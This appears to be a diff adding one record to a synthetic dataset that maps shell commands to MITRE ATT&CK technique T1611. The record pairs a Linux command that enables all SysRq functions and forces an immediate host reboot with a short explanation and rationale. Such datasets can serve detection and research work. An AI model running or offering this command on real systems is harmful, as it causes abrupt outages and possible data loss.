@@ -1,0 +1,21 @@
+{
+  "id": "SYN-SH-T1611-9ff8b2ac-e6c7a4c2",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "sh",
+  "command": "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger",
+  "explanation": "Enables all SysRq functions and then triggers a reboot of the host machine.",
+  "rationale_steps": [
+    "Sets kernel parameter to enable all SysRq functions using privileged access to `/proc/sys/kernel/sysrq`.",
+    "Commands a system reboot via SysRq, demonstrating escape and control over host environment."
+  ],
+  "source_prompt_hash": "9ff8b2ac",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:27:09.865372Z"
+}
